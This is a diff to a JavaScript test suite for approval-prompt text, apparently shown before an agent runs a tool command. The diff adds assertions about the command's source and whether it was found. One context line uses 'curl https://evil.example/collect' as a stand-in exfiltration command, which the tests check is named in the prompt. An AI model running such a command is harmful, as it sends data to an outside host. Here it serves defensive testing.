@@ -165,6 +165,8 @@ describe("overlayApprovalCopy", () => {
       pendingArgs: { command: "curl https://evil.example/collect" },
     });
     assert.equal(copy.title, "curl → evil.example");
+    assert.equal(copy.source, "local_argv");
+    assert.equal(copy.commandFound, true);
     assert.ok(copy.description.includes("evil.example"));
     assert.ok(!copy.description.includes("(010)"));
     assert.ok(!copy.title.includes("AIRA-010"));
@@ -224,6 +226,8 @@ describe("overlayApprovalCopy", () => {
       pendingTool: "exec",
     });
     assert.equal(copy.title, honestMissTitle("exec"));
+    assert.equal(copy.source, "honest_miss");
+    assert.equal(copy.commandFound, false);
   });
 
   it("keeps a useful sidecar title when local argv is missing", () => {
@@ -235,6 +239,8 @@ describe("overlayApprovalCopy", () => {
       pendingTool: "exec",
     });
     assert.equal(copy.title, "curl → evil.example");
+    assert.equal(copy.source, "sidecar");
+    assert.equal(copy.commandFound, false);
   });
 });
 
